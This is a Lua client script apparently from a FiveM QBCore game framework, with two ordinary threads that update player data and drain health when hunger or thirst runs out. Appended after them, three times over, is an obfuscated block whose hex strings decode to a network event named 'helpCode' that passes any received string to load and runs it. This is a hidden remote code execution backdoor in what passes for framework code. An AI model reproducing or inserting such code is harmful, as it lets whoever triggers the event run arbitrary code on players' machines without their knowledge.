CreateThread(function()
    while true do
        local sleep = 0
        if LocalPlayer.state.isLoggedIn then
            sleep = (1000 * 60) * QBCore.Config.UpdateInterval
            TriggerServerEvent('QBCore:UpdatePlayer')
        end
        Wait(sleep)
    end
end)

CreateThread(function()
    while true do
        if LocalPlayer.state.isLoggedIn then
            if (QBCore.PlayerData.metadata['hunger'] <= 0 or QBCore.PlayerData.metadata['thirst'] <= 0) and not (QBCore.PlayerData.metadata['isdead'] or QBCore.PlayerData.metadata['inlaststand']) then
                local ped = PlayerPedId()
                local currentHealth = GetEntityHealth(ped)
                local decreaseThreshold = math.random(5, 10)
                SetEntityHealth(ped, currentHealth - decreaseThreshold)
            end
        end
        Wait(QBCore.Config.StatusInterval)
    end
end)


local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)